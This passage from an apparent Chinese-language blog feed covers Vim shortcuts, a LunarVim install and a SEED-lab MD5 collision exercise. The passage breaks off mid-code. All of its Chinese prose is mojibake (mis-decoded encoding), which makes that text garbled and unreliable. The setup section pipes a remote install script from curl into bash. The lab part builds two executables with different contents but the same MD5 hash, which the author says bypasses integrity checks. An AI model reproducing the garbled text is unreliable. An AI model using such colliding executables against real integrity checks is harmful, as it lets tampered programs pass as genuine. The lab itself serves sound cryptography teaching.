title="ä¿å­˜/é€€å‡º"></a>ä¿å­˜/é€€å‡º</h2><p>ä¿å­˜/é€€å‡ºéƒ½è¦åœ¨å‘½ä»¤æ¨¡å¼ä¸‹å®Œæˆ</p><table><thead><tr><th>æŒ‰é”®</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>ï¼šw</td><td>ä»…ä¿å­˜</td></tr><tr><td>ï¼šq</td><td>é€€å‡º</td></tr><tr><td>ï¼šwq</td><td>ä¿å­˜ä¸”é€€å‡º</td></tr></tbody></table><h1 id="å¿«é€Ÿå…¥é—¨"><a href="#å¿«é€Ÿå…¥é—¨" class="headerlink" title="å¿«é€Ÿå…¥é—¨"></a>å¿«é€Ÿå…¥é—¨</h1><ul><li><p>vimtutorå‘½ä»¤æ‰“å¼€å®˜æ–¹æ•™ç¨‹ï¼Œå¹¶å»ºç«‹ä¸€ä»½æ•™ç¨‹æ–‡ä»¶çš„æ‹·è´ï¼Œè¯¥æ•™ç¨‹æœ‰å„ç§è¯­è¨€çš„ç‰ˆæœ¬ï¼Œå¦‚æœæƒ³è¦æ‰“å¼€ä¸­æ–‡ç‰ˆæœ¬ï¼Œè¾“å…¥<code>vimtutor zh</code>å³å¯</p></li><li><p>æŒ‰ CTRL-O å›è·³ï¼ŒC-Iåè·³</p></li><li><p>ZZä¿å­˜å¹¶é€€å‡º</p></li><li><p>â€œJâ€ å‘½ä»¤åˆ é™¤ä¸¤è¡Œé—´çš„æ¢è¡Œç¬¦</p></li><li><p>xåˆ é™¤å•ä¸ªå­—ç¬¦</p></li><li><p>ddåˆ é™¤æ•´è¡Œ</p></li><li><p>uæ’¤é”€</p></li><li><p>Uæ’¤é”€æ•´è¡Œæ‰€æœ‰ä¿®æ”¹</p></li><li><p>C-Ræ’¤é”€ä½ çš„æ’¤é”€</p></li><li><p>9kå‘ä¸Šç§»åŠ¨ 9 è¡Œ</p></li><li><p>wå‘åç§»åŠ¨ä¸€ä¸ªå•è¯</p></li><li><p>bå‘å‰ç§»åŠ¨ä¸€ä¸ªå•è¯</p></li><li><p>få‘å³ç§»åŠ¨åˆ°ä¸€ä¸ªæŒ‡å®šçš„å­—ç¬¦ï¼Œfyå‘å³ç§»åŠ¨åˆ°ç¬¬ä¸€ä¸ªyå‡ºç°çš„ä½ç½®    </p></li><li><p>Få‘å·¦ç§»åŠ¨åˆ°ä¸€ä¸ªæŒ‡å®šçš„å­—ç¬¦</p></li><li><p>%è¿›è¡Œæ‹¬å·åŒ¹é…</p></li><li><p>â€œHâ€ è¡¨ç¤º â€œHomeâ€ (å¤´)ï¼Œâ€Mâ€ è¡¨ç¤º â€œMiddleâ€ (ä¸­) è€Œ â€œLâ€ è¡¨ç¤º â€œLastâ€ (å°¾)</p></li><li><p>C-Gè¾“å‡ºä½ ç°åœ¨åœ¨çš„ä½ç½®</p></li><li><p>C-Då‘ä¸‹æ»šå±</p></li><li><p>C-Uå‘ä¸Š</p></li><li><p>zzè®©å…‰æ ‡ä¿æŒåœ¨å±å¹•ä¸­é—´</p></li><li><p>/patternè¿›è¡Œå­—ç¬¦ä¸²åŒ¹é…ï¼Œnå‘åæŸ¥æ‰¾ï¼ŒNå‘å‰æŸ¥æ‰¾</p></li><li><p>^åŒ¹é…è¡Œé¦–ï¼Œ$åŒ¹é…è¡Œå°¾ï¼Œd$åˆ é™¤å…‰æ ‡åˆ°å°¾ç«¯æ‰€æœ‰çš„æ–‡æœ¬</p></li><li><p>cwä¿®æ”¹ä¸€ä¸ªè¯ï¼Œc2wä¿®æ”¹ä¸¤ä¸ªè¯ï¼Œc$ä¿®æ”¹åˆ°è¡Œå°¾ï¼Œccä¿®æ”¹ä¸€æ•´è¡Œã€‚ç¡®åˆ‡åœ°è¯´ï¼Œå®ƒåˆ é™¤ä¸€ä¸ªè¯ï¼Œå¹¶åˆ‡æ¢åˆ°æ’å…¥æ¨¡å¼</p></li><li><p>çµæ´»çš„ç»„åˆä¸Šé¢å‘½ä»¤ï¼Œ/patternæŸ¥æ‰¾å­—ç¬¦ä¸²ï¼Œcwä¿®æ”¹å•è¯ï¼Œnæ‰¾åˆ°ä¸‹ä¸€ä¸ªå•è¯ï¼Œ<code>.</code>é‡å¤ä¿®æ”¹æ“ä½œï¼Œnç»§ç»­ä¸‹ä¸€ä¸ªå•è¯</p></li><li><p>dd+på¯ä»¥ç”¨æ¥ç§»åŠ¨æ–‡æœ¬</p></li><li><p>pæ¥å—è®¡æ•°å‰ç¼€ï¼Œæ¯”å¦‚3på°±æ˜¯æ’å…¥ç›¸åŒçš„æ–‡æœ¬ä¸‰æ¬¡</p></li><li><p>xpå¯ä»¥äº¤æ¢ä¸¤ä¸ªå­—ç¬¦ï¼Œæ¯”å¦‚ä½ æŠŠtheæ‰“æˆäº†tehï¼Œé‚£ä¹ˆæŠŠå…‰æ ‡æ”¾åˆ°eä¸‹é¢ï¼ŒæŒ‰ä¸‹xpå³å¯</p></li><li><p>yæ˜¯yankï¼ˆæŠ½å‡ºï¼‰çš„æ„æ€ï¼Œå¯ä»¥å°†æ–‡æœ¬æ‹·è´åˆ°å¯„å­˜å™¨ä¸­ï¼Œç„¶åä½¿ç”¨pç²˜è´´åˆ°åˆ«çš„åœ°æ–¹ã€‚ywå°±æ˜¯æ‹·è´ä¸€ä¸ªå•è¯çš„æ„æ€ã€‚yyæ‹·è´ä¸€æ•´è¡Œ</p></li><li><p>yawè¡¨ç¤ºyank a wordï¼Œå¯ä»¥åœ¨ä¸€ä¸ªå•è¯çš„ä»»æ„ä½ç½®å¤åˆ¶è¯¥å•è¯</p></li><li><p>ä¸€äº›ç»å¸¸ç”¨åˆ°çš„æ–‡æœ¬åˆ é™¤ï¼š</p></li></ul><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs less"><br><span class="hljs-selector-tag">x</span>       åˆ é™¤å…‰æ ‡ä¸‹çš„å­—ç¬¦ (<span class="hljs-string">&quot;dl&quot;</span> çš„ç¼©å†™)<br><span class="hljs-selector-tag">X</span>       åˆ é™¤å…‰æ ‡å‰çš„å­—ç¬¦ (<span class="hljs-string">&quot;dh&quot;</span> çš„ç¼©å†™)<br><span class="hljs-selector-tag">D</span>       ä»å½“å‰ä½ç½®åˆ é™¤åˆ°è¡Œå°¾ (<span class="hljs-string">&quot;d$&quot;</span> çš„ç¼©å†™)<br><span class="hljs-selector-tag">dw</span>      ä»å½“å‰ä½ç½®åˆ é™¤åˆ°ä¸‹ä¸€ä¸ªå•è¯å¼€å¤´<br><span class="hljs-selector-tag">db</span>      ä»å½“å‰ä½ç½®åˆ é™¤åˆ°å‰ä¸€ä¸ªå•è¯çš„å¼€å¤´<br><span class="hljs-selector-tag">diw</span>     åˆ é™¤å…‰æ ‡ä¸Šçš„å•è¯ (ä¸åŒ…æ‹¬ç©ºç™½å­—ç¬¦)<br><span class="hljs-selector-tag">daw</span>     åˆ é™¤å…‰æ ‡ä¸Šçš„å•è¯ (åŒ…æ‹¬ç©ºç™½å­—ç¬¦)<br><span class="hljs-selector-tag">dG</span>      åˆ é™¤åˆ°æ–‡ä»¶æœ«<br><span class="hljs-selector-tag">dgg</span>     åˆ é™¤åˆ°æ–‡ä»¶é¦–<br><br></code></pre></td></tr></table></figure><ul><li><p>~ å°†å­—ç¬¦çš„å¤§å°å†™è½¬æ¢</p></li><li><p>Iç§»åŠ¨åˆ°å½“å‰è¡Œç¬¬ä¸€ä¸ªéç©ºå­—ç¬¦å¤„å¹¶åˆ‡æ¢åˆ°æ’å…¥æ¨¡å¼</p></li><li><p>Aç§»åŠ¨åˆ°è¡Œå°¾å¹¶åˆ‡æ¢åˆ°æ’å…¥æ¨¡å¼</p></li></ul><h1 id="vimtutor"><a href="#vimtutor" class="headerlink" title="vimtutor"></a>vimtutor</h1><h1 id="lunavim"><a href="#lunavim" class="headerlink" title="lunavim"></a>lunavim</h1><p>é¦–å…ˆè¦å®‰è£…æœ€æ–°ç‰ˆneovimï¼Œå¦‚æœæ˜¯Ubuntuç›´æ¥apt installå¯èƒ½ä¼šå®‰è£…è¾ƒä½ç‰ˆæœ¬çš„nvimï¼Œä¸ç¬¦åˆlunavimçš„ç‰ˆæœ¬è¦æ±‚ï¼Œå¯ä»¥å‚è€ƒ<a href="https://github.com/neovim/neovim/releases/tag/stable%E8%BF%9B%E8%A1%8C%E5%AE%89%E8%A3%85">https://github.com/neovim/neovim/releases/tag/stableè¿›è¡Œå®‰è£…</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">wget https://github.com/neovim/neovim/releases/download/stable/nvim-linux64.deb<br><br>sudo apt install ./nvim-linux64.deb<br></code></pre></td></tr></table></figure><p>å¦‚æœç‰ˆæœ¬è¿‡ä½éœ€è¦å…ˆå¸è½½neovimå†é‡æ–°å®‰è£…</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt remove neovim-runtime    <br>sudo apt remove neovim  <br></code></pre></td></tr></table></figure><p>å®‰è£…lunavim</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install cargo<br><br>sudo apt-get install neovim    #éœ€è¦cargo<br><br>LV_BRANCH=&#x27;release-1.2/neovim-0.8&#x27; bash &lt;(curl -s https://raw.githubusercontent.com/lunarvim/lunarvim/fc6873809934917b470bff1b072171879899a36b/utils/installer/install.sh)<br></code></pre></td></tr></table></figure><blockquote><p>[ERROR]: Unable to verify plugins, make sure to manually run â€˜:PackerSyncâ€™ when starting lvim for the first time.</p><p>æ·»åŠ ç¯å¢ƒå˜é‡å³å¯ï¼š</p><p><code>export PATH=&quot;$PATH:/home/$USER/.local/bin&quot;</code></p><p>source ~/.bashrc</p></blockquote><p>è¿˜é‡åˆ°äº†ä¸€äº›ç”±äºç½‘ç»œå› ç´ è¢«å¢™æ— æ³•è®¿é—®å¤–ç½‘ä¸‹è½½æ’ä»¶çš„é—®é¢˜ï¼Œç»™æœåŠ¡å™¨æŒ‚ä»£ç†å³å¯è§£å†³ã€‚ç”±äºLinuxæŒ‚ä»£ç†æ¯”è¾ƒéº»çƒ¦ï¼Œå› æ­¤å»ºè®®ç›´æ¥èµ°ä¸»æœºä»£ç†</p><h1 id="ä¸€äº›å¥½ç”¨çš„vimèµ„æº"><a href="#ä¸€äº›å¥½ç”¨çš„vimèµ„æº" class="headerlink" title="ä¸€äº›å¥½ç”¨çš„vimèµ„æº"></a>ä¸€äº›å¥½ç”¨çš„vimèµ„æº</h1><ul><li><a href="https://www.openvim.com/">https://www.openvim.com/</a></li><li><a href="https://vim.rtorr.com/">Vim Cheat Sheet</a></li><li><a href="https://yianwillis.github.io/vimcdoc/doc/help.html">vimä¸­æ–‡æ–‡æ¡£è®¡åˆ’</a></li><li>vimçš„å®˜æ–¹æ•™ç¨‹ï¼ˆåœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥vimtutorï¼‰</li><li><a href="https://vimcn.github.io/vimcdoc/doc/help.html">vimä¸­æ–‡æ–‡æ¡£</a></li></ul><h1 id="Vimæ’ä»¶"><a href="#Vimæ’ä»¶" class="headerlink" title="Vimæ’ä»¶"></a>Vimæ’ä»¶</h1><ul><li><a href="https://www.twilio.com/blog/5-must-have-vim-plugins-that-will-change-your-workflow">5 Must-Have Vim Plugins That Will Change Your Workflow</a></li><li><a href="https://spacevim.org/">spacevim</a></li></ul><h1 id="åœ¨å…¶ä»–è½¯ä»¶ä¸Šä½¿ç”¨vim"><a href="#åœ¨å…¶ä»–è½¯ä»¶ä¸Šä½¿ç”¨vim" class="headerlink" title="åœ¨å…¶ä»–è½¯ä»¶ä¸Šä½¿ç”¨vim"></a>åœ¨å…¶ä»–è½¯ä»¶ä¸Šä½¿ç”¨vim</h1><ul><li>jetbrainç³»è½¯ä»¶çš„Vimæ’ä»¶</li><li>Chromeæµè§ˆå™¨çš„Surfingkeysæ’ä»¶</li><li>Vscodeçš„Vimæ’ä»¶</li></ul><h1 id="æ¨èé˜…è¯»"><a href="#æ¨èé˜…è¯»" class="headerlink" title="æ¨èé˜…è¯»"></a>æ¨èé˜…è¯»</h1><p><a href="https://zhuanlan.zhihu.com/p/599417117">å¦‚ä½•ä½¿ç”¨åŸç”Ÿ vim è¦†ç›–90%çš„æ’ä»¶åŠŸèƒ½ - çŸ¥ä¹</a><br><a href="https://stackoverflow.com/questions/1218390/what-is-your-most-productive-shortcut-with-vim/1220118#1220118">vi - What is your most productive shortcut with Vim? - Stack Overflow</a></p><h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1>]]></content>
    
    
    <categories>
      
      <category>è®¡ç®—æœºæ•™è‚²ä¸­ç¼ºå¤±çš„ä¸€è¯¾</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>Vim</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SEED-labï¼šMD5 Collision Attack Lab</title>
    <link href="/p/45f7d752/"/>
    <url>/p/45f7d752/</url>
    
    <content type="html"><![CDATA[<h1 id="Task-1-Generating-Two-Different-Files-with-the-Same-MD5-Hash"><a href="#Task-1-Generating-Two-Different-Files-with-the-Same-MD5-Hash" class="headerlink" title="Task 1: Generating Two Different Files with the Same MD5 Hash"></a>Task 1: Generating Two Different Files with the Same MD5 Hash</h1><p>åœ¨è¿™ä¸ªä»»åŠ¡ä¸­ï¼Œæˆ‘ä»¬å°†ç”Ÿæˆä¸¤ä¸ªå…·æœ‰ç›¸åŒ MD5å“ˆå¸Œå€¼çš„ä¸åŒæ–‡ä»¶ã€‚è¿™ä¸¤ä¸ªæ–‡ä»¶çš„å¼€å¤´éƒ¨åˆ†å¿…é¡»æ˜¯ç›¸åŒçš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒä»¬å…±äº«ç›¸åŒçš„å‰ç¼€ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ md5colgen ç¨‹åºå®ç°è¿™ä¸€ç‚¹ï¼Œè¯¥ç¨‹åºå…è®¸æˆ‘ä»¬æä¾›å…·æœ‰ä»»æ„å†…å®¹çš„å‰ç¼€æ–‡ä»¶</p><p>è¯¥ç¨‹åºçš„å·¥ä½œæ–¹å¼å¦‚å›¾æ‰€ç¤º</p><p><img src="https://img.gls.show/img/image-20230614012709811.png" alt="image-20230614012709811"></p><p>ä¸‹é¢çš„å‘½ä»¤ä¸ºç»™å®šçš„å‰ç¼€æ–‡ä»¶ prefix.txt ç”Ÿæˆä¸¤ä¸ªè¾“å‡ºæ–‡ä»¶ out1.bin å’Œ out2.bin:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> zara &gt; prefix.txt</span><br><span class="hljs-meta">$</span><span class="bash"> md5collgen -p prefix.txt -o out1.bin out2.bin</span><br></code></pre></td></tr></table></figure><p>è¿™æ ·å°±åˆ›å»ºäº†ä¸¤ä¸ªæ–‡ä»¶out1.bin out2.bin</p><p>å‘ç°ä¸¤ä¸ªæ–‡ä»¶çš„md5ç¡®å®ä¸€æ ·</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">[06/<span class="hljs-number">13</span>/<span class="hljs-number">23</span>]seed@VM:~$ md5sum out1.<span class="hljs-built_in">bin</span> out2.<span class="hljs-built_in">bin</span> <br>b1eb0da929692656edc11a9d93733d39  out1.<span class="hljs-built_in">bin</span><br>b1eb0da929692656edc11a9d93733d39  out2.<span class="hljs-built_in">bin</span><br></code></pre></td></tr></table></figure><blockquote><p>ç”±äº out1.bin å’Œ out2.bin æ˜¯äºŒè¿›åˆ¶çš„ï¼Œæˆ‘ä»¬ä¸èƒ½ä½¿ç”¨æ–‡æœ¬æŸ¥çœ‹å™¨ç¨‹åº(å¦‚ cat æˆ–æ›´å¤š)æŸ¥çœ‹å®ƒä»¬; æˆ‘ä»¬éœ€è¦ä½¿ç”¨äºŒè¿›åˆ¶ç¼–è¾‘å™¨æ¥æŸ¥çœ‹(å’Œç¼–è¾‘)å®ƒä»¬</p></blockquote><p>ä½¿ç”¨xxd -påˆ†åˆ«å–å‡ºä¸¤ä¸ªæ–‡ä»¶çš„åå…­è¿›åˆ¶åºåˆ—ï¼Œç”¨vimdiffæ¯”å¯¹ä¸€ä¸‹ï¼š</p><p><img src="https://img.gls.show/img/image-20230614012253064.png" alt="image-20230614012253064"></p><p>Questionï¼š</p><ul><li>å¦‚æœprefixä¸åˆ°64é‚£ä¹ˆä¼šè¡¥0ç›´åˆ°64ï¼ˆåŒ…å«0Aï¼‰ã€‚ä¹‹åä¼šç”Ÿæˆ128é•¿åº¦çš„å†…å®¹ï¼Œæ€»é•¿åº¦ä¸º64+128=192</li><li>å¦‚æœprefixæ­£å¥½æ˜¯64ï¼ˆ63ä¸ªA+ä¸€ä¸ª0Aï¼‰ï¼Œé‚£ä¹ˆä¸ä¼šè¡¥0ï¼Œæ€»é•¿åº¦ä¸º64+128=192<ul><li>ä½¿ç”¨<code>echo &quot;$(python3 -c &#39;print(&quot;A&quot;*63)&#39;)&quot; &gt; prefix.txt</code>å‘½ä»¤ï¼Œå¯ä»¥ä½¿å¾—è¯¥æ–‡ä»¶æœ‰63ä¸ªAå’Œä¸€ä¸ª0Aï¼Œæ­£å¥½æ˜¯64ä¸ª</li></ul></li><li>å¦‚æœprefixæ˜¯192ä¸ªï¼Œé‚£ä¹ˆä¸ä¼šè¡¥0ï¼Œæ€»é•¿åº¦ä¸º192+128</li><li>å¦‚æœprefixæ˜¯200ä¸ªï¼Œé‚£ä¹ˆä¼šè¡¥0ç›´åˆ°256ï¼Œæ€»é•¿åº¦ä¸º256+128</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell">[06/14/23]seed@VM:~$ echo &quot;$(python3 -c &#x27;print(&quot;A&quot;*256)&#x27;)&quot; &gt; prefix.txt <br>[06/14/23]seed@VM:~$ md5collgen -p prefix.txt -o p1.bin p2.bin <br>MD5 collision generator v1.5<br>by Marc Stevens (http://www.win.tue.nl/hashclash/)<br><br>Using output filenames: &#x27;p1.bin&#x27; and &#x27;p2.bin&#x27;<br>Using prefixfile: &#x27;prefix.txt&#x27;<br>Using initial value: 74ff661088a332eb0b5d16ad326e89c5<br><br>Generating first block: ............<br>Generating second block: S11.....................................<br>Running time: 9.41273 s<br>[06/14/23]seed@VM:~$ bless p1.bin <br>Gtk-Message: 10:37:59.970: Failed to load module &quot;canberra-gtk-module&quot;<br>Could not find a part of the path &#x27;/home/seed/.config/bless/plugins&#x27;.<br>Could not find a part of the path &#x27;/home/seed/.config/bless/plugins&#x27;.<br>Could not find a part of the path &#x27;/home/seed/.config/bless/plugins&#x27;.<br>Could not find file &quot;/home/seed/.config/bless/export_patterns&quot;<br>[06/14/23]seed@VM:~$ md5sum p1.bin p2.bin <br>fc4106d2ee477d8c0f1935bdd94122ac  p1.bin<br>fc4106d2ee477d8c0f1935bdd94122ac  p2.bin<br><br></code></pre></td></tr></table></figure><h1 id="Task-2-Understanding-MD5â€™s-Property"><a href="#Task-2-Understanding-MD5â€™s-Property" class="headerlink" title="Task 2: Understanding MD5â€™s Property"></a>Task 2: Understanding MD5â€™s Property</h1><p>MD5ç®—æ³•çš„å¦‚ä¸‹æ€§è´¨: ç»™å®šä¸¤ä¸ªè¾“å…¥ M å’Œ Nï¼Œå¦‚æœ MD5(M) = MD5(N) ï¼Œå³ M å’Œ N çš„ MD5æ•£åˆ—æ˜¯ç›¸åŒçš„ï¼Œé‚£ä¹ˆå¯¹äºä»»ä½•è¾“å…¥ Tï¼ŒMD5(M â€– T) = MD5(N â€– T) ï¼Œå…¶ä¸­â€–è¡¨ç¤ºçº§è”</p><p>éªŒè¯æ€§è´¨ï¼šå¦‚æœè¾“å…¥ M å’Œ N å…·æœ‰ç›¸åŒçš„å“ˆå¸Œå€¼ï¼Œå°†ç›¸åŒçš„åç¼€ T æ·»åŠ åˆ°å®ƒä»¬å°†å¯¼è‡´å…·æœ‰ç›¸åŒå“ˆå¸Œå€¼çš„ä¸¤ä¸ªè¾“å‡ºã€‚æ­¤å±æ€§ä¸ä»…é€‚ç”¨äº MD5å“ˆå¸Œç®—æ³•ï¼Œè¿˜é€‚ç”¨äºè®¸å¤šå…¶ä»–å“ˆå¸Œç®—æ³•ã€‚åœ¨è¿™ä¸ªä»»åŠ¡ä¸­çš„å·¥ä½œæ˜¯è®¾è®¡ä¸€ä¸ªå®éªŒæ¥è¯æ˜è¿™ä¸ªå±æ€§é€‚ç”¨äº MD5</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">[06/14/23]seed@VM:~$ md5sum p1.bin p2.bin <br>69c4760a3459c3ec8f93d3022a7c6654  p1.bin<br>69c4760a3459c3ec8f93d3022a7c6654  p2.bin<br>[06/14/23]seed@VM:~$ echo nm &gt;&gt; p1.bin <br>[06/14/23]seed@VM:~$ echo nm &gt;&gt; p2.bin <br>[06/14/23]seed@VM:~$ md5sum p1.bin p2.bin <br>6b4afe7b7301613ae99ce848080ffa96  p1.bin<br>6b4afe7b7301613ae99ce848080ffa96  p2.bin<br></code></pre></td></tr></table></figure><h1 id="Task-3-Generating-Two-Executable-Files-with-the-Same-MD5-Hash"><a href="#Task-3-Generating-Two-Executable-Files-with-the-Same-MD5-Hash" class="headerlink" title="Task 3: Generating Two Executable Files with the Same MD5 Hash"></a>Task 3: Generating Two Executable Files with the Same MD5 Hash</h1><p>åˆ›å»ºä¸¤ä¸ªå¯æ‰§è¡Œç¨‹åºï¼Œä½¿å…¶ xyz æ•°ç»„çš„å†…å®¹ä¸åŒï¼Œä½†å¯æ‰§è¡Œæ–‡ä»¶çš„å“ˆå¸Œå€¼æ˜¯ç›¸åŒçš„ã€‚è¿™ä¸ªè¿˜æœ‰æ„æ€ï¼Œä½ å¯ä»¥æŠŠä¸€ä¸ªç¨‹åºçš„å†…å®¹æ”¹å˜ï¼Œä½†æ˜¯åœ¨md5çš„å±‚é¢ä¸Šï¼Œå®ƒä»¬æ˜¯æ²¡æœ‰åŒºåˆ«çš„ï¼Œä»è€Œç»•è¿‡å®Œæ•´æ€§éªŒè¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> xyz[<span class="hljs-number">200</span>] = &#123;<br>    <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span><br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">200</span>; i++)&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x&quot;</span>, xyz[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”Ÿæˆxyzæ•°ç»„</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;$(python3 -c &#x27;print(&quot;0x41,&quot;*199)&#x27;)&quot;<br></code></pre></td></tr></table></figure><p>ä¼šç”¨åˆ°çš„å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> head -c 3200 a.out &gt; prefix</span><br><span class="hljs-meta">$</span><span class="bash"> tail -c 100 a.out &gt; suffix</span><br><span class="hljs-meta">$</span><span class="bash"> tail -c +3300 a.out &gt; suffix</span><br></code></pre></td></tr></table></figure><ul><li>ç¬¬ä¸€ä¸ªå‘½ä»¤å°† a.out çš„å‰3200å­—èŠ‚ä¿å­˜ä¸ºprefix</li><li>ç¬¬äºŒä¸ªå‘½ä»¤å°†æ–‡ä»¶çš„æœ€å100å­—èŠ‚ä¿å­˜ä¸ºsuffix</li><li>ç¬¬ä¸‰ä¸ªå‘½ä»¤å°†æ–‡ä»¶çš„ç¬¬3300ä¸ªå­—èŠ‚åˆ°æœ«å°¾çš„æ•°æ®ä¿å­˜åˆ°suffix</li></ul><p>ä¸€ä¸ªåŸºæœ¬åŸç†ï¼šè‹¥$MD5 (prefix â€–P) = MD5 (prefix â€–Q)$æˆç«‹ï¼Œé‚£ä¹ˆ$MD5 (prefix â€–P â€–suffix) = MD5 (prefix â€–Q â€–suffix)æˆç«‹$</p><p>æ¢å¥è¯è¯´ï¼Œå¦‚æœä¸€ä¸ªæ–‡ä»¶å’Œå¦ä¸€ä¸ªæ–‡ä»¶çš„md5å€¼å·²ç»ç›¸ç­‰ï¼Œé‚£ä¹ˆåœ¨å®ƒä»¬çš„åé¢é™„åŠ ç›¸åŒçš„å†…å®¹ï¼Œä»ç„¶ç›¸ç­‰</p><p><strong>å›åˆ°è¿™ä¸ªä»»åŠ¡çš„è¦æ±‚ä¸Šï¼Œæˆ‘ä»¬æ‰¾åˆ°äºŒè¿›åˆ¶æ–‡ä»¶åå…­è¿›åˆ¶å…ˆæ˜¾ç¤ºçš„prefix+AAAAå¤„ï¼Œæ‰§è¡Œmd5colï¼Œå¯ä»¥å¾—åˆ°md5colï¼ˆprefix+AAAAï¼‰ï¼Œä¹‹åå†é™„åŠ suffixï¼Œå³å¯å®Œæˆç›®æ ‡æ‰€éœ€çš„ä¸¤ä¸ªå¯æ‰§è¡Œæ–‡ä»¶</strong></p><p>çœ‹ä¸€ä¸‹AAAAçš„ä½ç½®</p><p><img src="https://img.gls.show/img/image-20230615004528181.png" alt="image-20230615004528181"></p><p>$12320/64=192.5$</p><p>$12352/64=193$</p><p>å› æ­¤ï¼Œ12353~æœ«å°¾ä¸ºsuffix</p><p>ä¸‹é¢è¿‡ç¨‹æ¯”è¾ƒç®€å•å°±ä¸æè¿°äº†</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 